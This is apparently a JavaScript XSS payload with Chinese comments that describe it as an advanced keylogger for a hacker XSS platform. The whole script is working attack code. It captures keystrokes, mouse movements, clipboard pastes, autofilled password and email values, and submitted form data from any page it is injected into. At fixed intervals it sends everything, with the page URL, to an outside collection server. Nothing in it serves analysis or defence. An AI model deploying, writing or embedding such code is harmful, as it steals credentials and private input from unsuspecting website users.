// 高级键盘记录器Payload - 黑客仓库XSS平台（已存在，参考 keylogger.js）
// 增强版本：包含鼠标轨迹、表单自动填充检测、粘贴检测

(function() {
    'use strict';
    
    var config = {
        serverUrl: 'https://xss.li/api/collect.php',
        sendInterval: 10000, // 10秒发送一次
        captureMouseTrack: true, // 捕获鼠标轨迹
        capturePaste: true, // 捕获粘贴内容
        captureAutofill: true // 检测自动填充
    };
    
    var logData = {
        keystrokes: [],
        mouseTrack: [],
        pasteData: [],
        autofillData: [],
        formData: []
    };
    
    console.log('⌨️ 黑客仓库XSS - 高级键盘记录器');
    
    // 键盘记录
    document.addEventListener('keydown', function(e) {
        logData.keystrokes.push({
            key: e.key,
            code: e.code,
            target: getElementPath(e.target),
            time: Date.now(),
            ctrl: e.ctrlKey,
            shift: e.shiftKey,
            alt: e.altKey
        });
    });
    
    // 鼠标轨迹（采样记录）
    if (config.captureMouseTrack) {
        var lastMouseTime = 0;
        document.addEventListener('mousemove', function(e) {
            var now = Date.now();
            if (now - lastMouseTime > 500) { // 每500ms记录一次
                logData.mouseTrack.push({
                    x: e.clientX,
                    y: e.clientY,
                    time: now
                });
                lastMouseTime = now;
            }
        });
        
        document.addEventListener('click', function(e) {
            logData.mouseTrack.push({
                type: 'click',
                x: e.clientX,
                y: e.clientY,
                target: getElementPath(e.target),
                time: Date.now()
            });
        });
    }
    
    // 粘贴检测
    if (config.capturePaste) {
        document.addEventListener('paste', function(e) {
            var pastedText = (e.clipboardData || window.clipboardData).getData('text');
            logData.pasteData.push({
                content: pastedText,
                target: getElementPath(e.target),
                time: Date.now()
            });
            console.log('📋 检测到粘贴:', pastedText.substring(0, 20));
        });
    }
    
    // 自动填充检测
    if (config.captureAutofill) {
        var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');
        inputs.forEach(function(input) {
            var lastValue = input.value;
            
            setInterval(function() {
                if (input.value !== lastValue && input.value.length > 0) {
                    // 可能是自动填充
                    if (!document.activeElement || document.activeElement !== input) {
                        logData.autofillData.push({
                            field: getElementPath(input),
                            value: input.value,
                            time: Date.now()
                        });
                        console.log('🤖 检测到自动填充');
                    }
                    lastValue = input.value;
                }
            }, 1000);
        });
    }
    
    // 表单提交监听
    document.addEventListener('submit', function(e) {
        var formData = new FormData(e.target);
        var data = {};
        
        formData.forEach(function(value, key) {
            data[key] = value;
        });
        
        logData.formData.push({
            action: e.target.action,
            method: e.target.method,
            data: data,
            time: Date.now()
        });
        
        console.log('📝 表单提交:', e.target.action);
    }, true);
    
    // 获取元素路径
    function getElementPath(element) {
        if (!element) return '';
        
        var path = element.tagName.toLowerCase();
        if (element.id) path += '#' + element.id;
        if (element.name) path += '[name="' + element.name + '"]';
        if (element.className) path += '.' + element.className.split(' ').join('.');
        
        return path;
    }
    
    // 定期发送数据
    setInterval(async function() {
        if (logData.keystrokes.length === 0 && 
            logData.mouseTrack.length === 0 && 
            logData.pasteData.length === 0 &&
            logData.formData.length === 0) {
            return;
        }
        
        try {
            const response = await fetch(config.serverUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'advanced_keylogger',
                    data: logData,
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    stats: {
                        keystrokes: logData.keystrokes.length,
                        mousePoints: logData.mouseTrack.length,
                        pastes: logData.pasteData.length,
                        autofills: logData.autofillData.length,
                        forms: logData.formData.length
                    }
                })
            });
            
            if (response.ok) {
                console.log('✅ 日志已上传');
                // 清空已发送的数据
                logData.keystrokes = [];
                logData.mouseTrack = [];
                logData.pasteData = [];
                logData.autofillData = [];
                logData.formData = [];
            }
        } catch (error) {
            console.error('上传失败:', error);
        }
    }, config.sendInterval);
    
})();
